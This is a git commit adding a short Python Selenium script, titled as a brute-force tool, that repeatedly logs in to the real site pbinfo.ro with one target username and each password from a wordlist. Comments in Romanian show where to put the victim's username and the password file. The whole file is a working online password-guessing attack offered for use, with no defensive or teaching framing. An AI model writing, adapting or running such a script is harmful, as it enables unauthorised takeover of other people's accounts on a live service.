e0be601b2a68775d7f7a3da338fd8fe544e94686
AlbinoFan34 <129579005+AlbinoFan34@users.noreply.github.com>
2023-04-10 18:54:02 +0300

    Add files via upload

---
+++ pbinfo-brute-force.py
@@ -0,0 +1,22 @@
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.common.action_chains import ActionChains
+import time
+
+
+PATH = "C:\Program Files (x86)\chromedriver.exe"
+
+driver = webdriver.Chrome(PATH)
+username = "pbinfouser" # pune numele userului aici
+
+passwords = open('pbinfopasswords.txt',"r") # puneți fișierul cu parole aici 
+Lines = passwords.readlines()
+for line in Lines:
+ driver.get("https://www.pbinfo.ro/")
+ driver.find_element(By.CSS_SELECTOR,"#navbar > ul.nav.navbar-nav.navbar-right > li:nth-child(1) > a").click()
+ time.sleep(1)
+ driver.find_element(By.ID,"user_login").send_keys(username)
+ driver.find_element(By.CSS_SELECTOR,"#parola_login").send_keys(line.strip())
+ driver.find_element(By.CSS_SELECTOR,"#form-login-modal > div.modal-footer > div:nth-child(1) > div > button.btn.btn-primary").click()
+ time.sleep(4)
+
